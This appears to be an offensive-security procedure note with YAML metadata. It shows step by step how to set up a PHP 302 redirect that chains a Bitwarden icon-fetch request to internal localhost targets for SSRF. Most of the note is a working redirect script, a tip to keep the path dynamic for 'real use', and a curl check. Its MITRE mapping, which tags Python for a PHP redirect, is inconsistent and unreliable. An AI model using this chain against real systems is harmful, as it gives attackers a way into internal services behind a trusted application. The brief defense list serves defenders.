---
tags:
  - redirect
  - php
  - ssrf-chain
type: procedure
tools:
  - '[[tools/PHP]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/php-http-redirect]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Python]]'
updated_at: '2025-12-14T04:08:55.264Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
id: 5c5b5a0a-153f-4752-bebe-ff45738a8962
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Python]]'
---
# Create PHP Redirect Script

## Summary

Develop a PHP script to issue an HTTP 302 redirect from the public domain to an internal subdomain, preserving the path for SSRF exploitation.

## Description

The script runs on the Nginx server, receiving the icon fetch GET request and redirecting to http://test.local.yourdomain.com/PATH_IS_KEPT. This leverages DNS to resolve to 0.0.0.0, targeting localhost while Bitwarden follows up to 2 redirects without re-validating IPs.

## Requirements

1. PHP enabled on webserver
2. Write access to /var/www/html
3. Knowledge of HTTP headers

## Defense

Defensive measures and detection strategies:

- Block or log redirects to internal/reserved IPs
- Limit redirect depth in applications
- Scan for PHP files with suspicious Location headers

## Objectives

1. Chain external request to internal target
2. Maintain request path for arbitrary internal paths
3. Exploit redirect following in icon service

## Instructions

### Step 1: Create index.php

**Context**: Place the redirect logic at the root.

Execute [[commands/php-http-redirect]] by saving to /var/www/html/index.php:

```php
<?php header("Location: http://test.local.yourdomain.com/PATH_IS_KEPT"); exit(); ?>
```

> Note: Replace PATH_IS_KEPT with dynamic $_SERVER['REQUEST_URI'] for real use; static for PoC.

### Step 2: Test Redirect

**Context**: Verify functionality.

```bash
curl -I http://www.yourdomain.com/testpath
```

> Expected: HTTP/1.1 302 Found with Location: http://test.local.yourdomain.com/testpath

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Python]] Python Interpreter (adapted for PHP)

### Sub-Techniques


## Commands Used

- [[commands/php-http-redirect]]

## Tools Used

- [[tools/PHP]]

## Tags

- redirect
- php
- ssrf-chain
